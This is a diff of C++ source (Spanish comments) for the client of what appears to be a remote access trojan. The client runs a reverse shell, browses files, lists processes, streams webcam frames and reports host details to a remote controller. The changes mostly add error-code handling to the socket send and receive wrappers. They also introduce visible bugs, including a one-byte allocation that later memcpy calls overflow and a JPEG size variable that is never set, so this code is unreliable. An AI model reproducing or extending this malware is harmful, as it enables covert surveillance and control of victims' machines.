@@ -90,6 +90,7 @@ bool Cliente::bConectar(const char* cIP, const char* cPuerto) {
 void Cliente::MainLoop() {
 
     //Esperar por comandos
+    DWORD error_code = 0;
     char cBuffer[1024 * 100]; //100 kb (transferencia de archivos)
     memset(&cBuffer, 0, sizeof(cBuffer));
     while (true) {
@@ -104,10 +105,20 @@ void Cliente::MainLoop() {
             memset(&cBuffer, 0, sizeof(cBuffer));
         }
 
-        int iRecibido = this->cRecv(this->sckSocket, cBuffer, sizeof(cBuffer), false);
+        int iRecibido = this->cRecv(this->sckSocket, cBuffer, sizeof(cBuffer), 0, false, &error_code);
 
-        if (iRecibido <= 0 && GetLastError() != WSAEWOULDBLOCK) {
+        if (iRecibido < 0 && error_code != WSAEWOULDBLOCK) {
             //No se pudo recibir nada
+            if (this->mod_Cam != nullptr) {
+                for(auto cCam : this->mod_Cam->vcCamObjs) {
+                    //Si alguna camara esta live esperar un poco y tratar de volver a leer
+                    if (cCam.isLive) {
+                        Sleep(100);
+                        continue;
+                    }
+                }
+            }
+            DebugPrint("[MAIN-LOOP] No se pudo recibir nada");
             break;
         }
 
@@ -187,7 +198,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
         DebugPrint("[!]PING");
         std::string strComand = std::to_string(EnumComandos::PONG);
         strComand.append(1, CMD_DEL);
-        this->cSend(this->sckSocket, strComand.c_str(), strComand.size()+1, 0, false);
+        this->cSend(this->sckSocket, strComand.c_str(), strComand.size()+1, 0, false, nullptr);
         return;
     }
 
@@ -220,7 +231,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
         }
         strDipositivos = strDipositivos.substr(0, strDipositivos.length() - 1);
 
-        this->cSend(this->sckSocket, strDipositivos.c_str(), strDipositivos.size() + 1, 0, false);
+        this->cSend(this->sckSocket, strDipositivos.c_str(), strDipositivos.size() + 1, 0, false, nullptr);
         return;
     }
 
@@ -234,7 +245,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
                 std::string strPathBCDown = std::to_string(EnumComandos::FM_CPATH);
                 strPathBCDown.append(1, CMD_DEL);
                 strPathBCDown += strPath;
-                this->cSend(this->sckSocket, strPathBCDown.c_str(), strPathBCDown.size(), 0, true);
+                this->cSend(this->sckSocket, strPathBCDown.c_str(), strPathBCDown.size(), 0, true, nullptr);
                 Sleep(10);
             }
             else if (strIn[1] == "ESCRI-DESK") {
@@ -242,7 +253,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
                 std::string strPathBCDesk = std::to_string(EnumComandos::FM_CPATH);
                 strPathBCDesk.append(1, CMD_DEL);
                 strPathBCDesk += strPath;
-                this->cSend(this->sckSocket, strPathBCDesk.c_str(), strPathBCDesk.size(), 0, true);
+                this->cSend(this->sckSocket, strPathBCDesk.c_str(), strPathBCDesk.size(), 0, true, nullptr);
                 Sleep(10);
             }
             else {
@@ -252,7 +263,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
                 std::string strCommand = std::to_string(EnumComandos::FM_Dir_Folder);
                 strCommand.append(1, CMD_DEL);
                 strCommand.append(item);
-                this->cSend(this->sckSocket, strCommand.c_str(), strCommand.size(), 0, true);
+                this->cSend(this->sckSocket, strCommand.c_str(), strCommand.size(), 0, true, nullptr);
                 Sleep(30);
             }
         }
@@ -349,7 +360,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
         std::string strProc = std::to_string(EnumComandos::PM_Lista);
         strProc.append(1, CMD_DEL);
         strProc += strProcessList();
-        this->cSend(this->sckSocket, strProc.c_str(), strProc.size(), 0, false);
+        this->cSend(this->sckSocket, strProc.c_str(), strProc.size(), 0, false, nullptr);
         return;
     }
     
@@ -410,7 +421,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
         } else {
             strPaquete += "Nica|Nica2 :v";
         }
-        this->cSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true);
+        this->cSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, nullptr);
         return;
     }
 
@@ -452,37 +463,25 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
                 strHeader.append(1, CMD_DEL);
 
                 //Testing
-                int iBufferSize = 0;
                 int iHeaderSize = strHeader.size();
                 u_int iJPGBufferSize = 0;
                 u_int uiPacketSize = 0;
-                BYTE* cBuffer = this->mod_Cam->GetFrame(iBufferSize, iDeviceIndex);
-                BYTE* cJPGBuffer = nullptr;
-                BYTE* cPacket = nullptr;
-
-                if (cBuffer) {
-                    cJPGBuffer = this->mod_Cam->toJPEG(cBuffer, iBufferSize, iJPGBufferSize);
-                    if (cJPGBuffer) {
+                std::vector<BYTE> cBuffer = this->mod_Cam->GetFrame(iDeviceIndex);
+                
+                if (cBuffer.size() > 0) {
+                    std::vector<BYTE> cJPGBuffer = this->mod_Cam->toJPEG(cBuffer.data(), cBuffer.size());
+                    if (iJPGBufferSize > 0) {
                         uiPacketSize = iHeaderSize + iJPGBufferSize;
-                        cPacket = new BYTE[uiPacketSize];
+                        std::unique_ptr<BYTE> cPacket = std::make_unique<BYTE>(uiPacketSize);
                         if (cPacket) {
-                            memcpy(cPacket, strHeader.c_str(), iHeaderSize);
-                            memcpy(cPacket + iHeaderSize, cJPGBuffer, iJPGBufferSize);
+                            memcpy(cPacket.get(), strHeader.c_str(), iHeaderSize);
+                            memcpy(cPacket.get() + iHeaderSize, cJPGBuffer.data(), cJPGBuffer.size());
 
-                            int iSent = this->cSend(this->sckSocket, (const char*)cPacket, uiPacketSize, 0, true);
+                            int iSent = this->cSend(this->sckSocket, reinterpret_cast<const char*>(cPacket.get()), uiPacketSize, 0, true, nullptr);
                             DebugPrint("[!] " + std::to_string(iSent) + " bytes sent");
 
-                            delete[] cPacket;
-                            cPacket = nullptr;
                         }
-                        delete[] cJPGBuffer;
-                        cJPGBuffer = nullptr;
                     }
-                }
-
-                if (cBuffer) {
-                    delete[] cBuffer;
-                    cBuffer = nullptr;
                 }
             }
 
@@ -605,12 +604,12 @@ void Cliente::iniPacket() {
     strOut.append(1, CMD_DEL);
     strOut += strCpu();
     
-    int iB = cSend(this->sckSocket, strOut.c_str(), strOut.length(), 0, false);
+    int iB = cSend(this->sckSocket, strOut.c_str(), strOut.length(), 0, false, nullptr);
     
     DebugPrint("[INIT]Enviados " + std::to_string(iB) + " bytes");
 }
 
-int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock) {
+int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code) {
     
     // 1 non block
     // 0 block
@@ -661,6 +660,7 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
         }
 
     }else {
+        //No comprimir ya que el buffer no es tan grande
         std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
     }
 
@@ -682,7 +682,10 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
     }
     
     iEnviado = send(pSocket, reinterpret_cast<const char*>(cData.data()), iDataSize, pFlags);
-        
+    if (err_code != nullptr) {
+        *err_code = GetLastError();
+    }
+
     //Restaurar
     if (isBlock) {
         if (!this->BLOCK_MODE) {
@@ -693,11 +696,10 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
         }
     }
 
-    //DebugPrint("[SCK] " + std::to_string(iEnviado) + " bytes enviados");
     return iEnviado;
 }
 
-int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool isBlock) {
+int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code) {
     //Aqui el socket por defecto es block asi que si se pasa false es normal
     // 1 non block
     // 0 block
@@ -721,7 +723,9 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
     }
         
     iRecibido = recv(pSocket, cTmpBuff.get(), pLen, pFlags);
-        
+    if (err_code != nullptr) {
+        *err_code = GetLastError();
+    }
     if (iRecibido <= 0) {
         return -1;
     }
@@ -761,11 +765,11 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
                     }
                 }else {
                     DebugPrint("Error descomprimiendo el buffer");
-                    return -1;
+                    iRecibido = 0;
                 }
             }else {
                 DebugPrint("No se pudo reservar memoria para descomprimir el paquete");
-                return -1;
+                iRecibido = 0;
             }
         }else {
             //No tiene la cabecera de compreso, copiar buffer desencriptado
@@ -872,7 +876,7 @@ bool ReverseShell::SpawnShell(const char* pstrComando) {
     if (this->copy_ptr != nullptr) {
         std::string strRun = "04" + CMD_DEL;
         strRun += "RU";
-        this->copy_ptr->cSend(this->sckSocket, strRun.c_str(), strRun.size(), 0, false);
+        this->copy_ptr->cSend(this->sckSocket, strRun.c_str(), strRun.size(), 0, false, nullptr);
     }
     
     this->tRead = std::thread(&ReverseShell::thLeerShell, this, stdoutRd);
@@ -893,7 +897,7 @@ void ReverseShell::TerminarShell() {
     std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Finish);
     strComando += CMD_DEL;
     strComando += "Done...";
-    this->copy_ptr->cSend(this->sckSocket, strComando.c_str(), strComando.size()+1, 0, false);
+    this->copy_ptr->cSend(this->sckSocket, strComando.c_str(), strComando.size()+1, 0, false, nullptr);
 
     TerminateProcess(this->pi.hProcess, 0);
     if (this->stdinRd != nullptr) {
@@ -939,7 +943,7 @@ void ReverseShell::thLeerShell(HANDLE hPipe) {
             strOut.append(1, CMD_DEL);
             strOut += cBuffer2;
         
-            int iEnviado = this->copy_ptr->cSend(this->sckSocket, strOut.c_str(), strOut.size(), 0, false);
+            int iEnviado = this->copy_ptr->cSend(this->sckSocket, strOut.c_str(), strOut.size(), 0, false, nullptr);
             Sleep(10);
             if (iEnviado <= 0) {
                 //Desconectado o se perdio la conexion
